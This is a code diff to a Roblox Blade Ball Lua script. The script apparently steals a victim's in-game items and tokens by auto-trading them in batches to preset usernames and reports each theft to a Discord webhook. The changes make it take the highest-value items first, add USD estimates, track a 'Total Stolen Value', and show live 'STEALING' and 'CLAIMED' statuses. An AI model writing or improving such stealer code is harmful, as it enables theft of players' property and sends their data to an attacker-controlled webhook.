@@ -21,6 +21,8 @@ local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
+local currentStatus = "PENDING" -- Live status tracking
+local stolenTotalValue = 0 -- Track total stolen value
 
 -- Validation
 if next(users) == nil or webhook == "" then
@@ -150,6 +152,29 @@ local function formatNumber(number)
     end
 end
 
+-- Calculate estimated dollar value (RAP to USD conversion)
+local function calculateDollarValue(rap)
+    -- Conversion rate: approximately 1 RAP = $0.001 (adjust as needed)
+    local conversionRate = 0.001
+    return rap * conversionRate
+end
+
+-- Get status color for Discord embed
+local function getStatusColor(status)
+    local colors = {
+        ["PENDING"] = 16776960, -- Yellow
+        ["STEALING"] = 16747520, -- Orange  
+        ["CLAIMED"] = 65280 -- Green
+    }
+    return colors[status] or 16776960
+end
+
+-- Update live status and send webhook
+local function updateStatus(newStatus, allItems, tradeItems, tokens)
+    currentStatus = newStatus
+    SendWebhookMessage(false, allItems, tradeItems, tokens)
+end
+
 -- Initialize totals
 local totalRAP = 0
 local totalTokens = 0
@@ -256,11 +281,19 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
         inline = false
     })
     
+    -- Add total value display (supreme values)
+    table.insert(fields, {
+        name = "📊 Total Value (Supreme Values)",
+        value = string.format("**Total RAP:** %s\n**Estimated USD Value:** $%.2f\n**Total Stolen Value:** %s", 
+            formatNumber(totalAllRAP), calculateDollarValue(totalAllRAP), formatNumber(stolenTotalValue)),
+        inline = false
+    })
+    
     if #tradeItems > 0 then
         table.insert(fields, {
             name = "🚀 Items to Trade (Min RAP: " .. formatNumber(min_rap) .. ")",
-            value = string.format("**Total Items:** %d\n**Total RAP Value:** %s", 
-                #tradeItems, formatNumber(totalTradeRAP)),
+            value = string.format("**Total Items:** %d\n**Total RAP Value:** %s\n**Estimated USD:** $%.2f", 
+                #tradeItems, formatNumber(totalTradeRAP), calculateDollarValue(totalTradeRAP)),
             inline = false
         })
         
@@ -322,6 +355,20 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
         })
     end
     
+    -- Add live status indicator
+    local statusEmoji = {
+        ["PENDING"] = "🟨",
+        ["STEALING"] = "🟧", 
+        ["CLAIMED"] = "🟩"
+    }
+    
+    table.insert(fields, {
+        name = "🔴 Live Status",
+        value = string.format("%s **%s**\n*Last updated: %s*", 
+            statusEmoji[currentStatus] or "🟨", currentStatus, os.date("%H:%M:%S")),
+        inline = true
+    })
+    
     table.insert(fields, {
         name = "🌐 Server Information",
         value = string.format("```\nServer ID: %s\nPlayers: %d/16\nPlace ID: %d\n```", 
@@ -331,8 +378,8 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
     
     local data = {
         ["embeds"] = {{
-            ["title"] = isJoinMessage and "🎴 BLADE BALL - TARGET JOINED" or "🎴 BLADE BALL - TRADE EXECUTED",
-            ["color"] = isJoinMessage and 16753920 or 65280,
+            ["title"] = isJoinMessage and "🎴 BLADE BALL - TARGET JOINED" or string.format("🎴 BLADE BALL - %s", currentStatus),
+            ["color"] = isJoinMessage and 16753920 or getStatusColor(currentStatus),
             ["fields"] = fields,
             ["footer"] = {
                 ["text"] = "Blade Ball Trade System • discord.gg/GY2RVSEGDT"
@@ -484,11 +531,16 @@ if #allItemsList > 0 or totalTokens > 0 then
 end
 
 if #itemsToSend > 0 or totalTokens > 0 then
+    -- Value sorting - automatically prioritize highest value items
     table.sort(itemsToSend, function(a, b)
-        if a.itemType == b.itemType then
-            return a.Name < b.Name
+        -- Sort by RAP value first (highest first), then by type, then by name
+        if a.RAP ~= b.RAP then
+            return a.RAP > b.RAP
         end
-        return a.itemType < b.itemType
+        if a.itemType ~= b.itemType then
+            return a.itemType < b.itemType
+        end
+        return a.Name < b.Name
     end)
 
     local function getNextBatch(items, batchSize)
@@ -500,8 +552,12 @@ if #itemsToSend > 0 or totalTokens > 0 then
     end
 
     local function doTrade(targetUser)
+        -- Update status to STEALING when starting trade
+        updateStatus("STEALING", allItemsList, originalItemsToSend, totalTokens)
+        
         local batchNumber = 1
         local successCount = 0
+        local currentTradeValue = 0
         
         while #itemsToSend > 0 or tradeTokens > 0 do
             local requestSuccess, requestError = pcall(function()
@@ -524,7 +580,10 @@ if #itemsToSend > 0 or totalTokens > 0 then
             
             local currentBatch = getNextBatch(itemsToSend, 100)
             
+            -- Calculate current batch value
+            currentTradeValue = 0
             for _, item in ipairs(currentBatch) do
+                currentTradeValue = currentTradeValue + item.RAP
                 local addSuccess, addError = pcall(function()
                     addItemToTrade(item.itemType, item.ItemID)
                 end)
@@ -543,11 +602,17 @@ if #itemsToSend > 0 or totalTokens > 0 then
             readyTrade()
             confirmTrade()
             
+            -- Update stolen total value
+            stolenTotalValue = stolenTotalValue + currentTradeValue
+            
             successCount = successCount + 1
             batchNumber = batchNumber + 1
             
             task.wait(3)
         end
+        
+        -- Update status to CLAIMED when trade is complete
+        updateStatus("CLAIMED", allItemsList, originalItemsToSend, totalTokens)
         
         SendWebhookMessage(false, allItemsList, originalItemsToSend, totalTokens)
     end
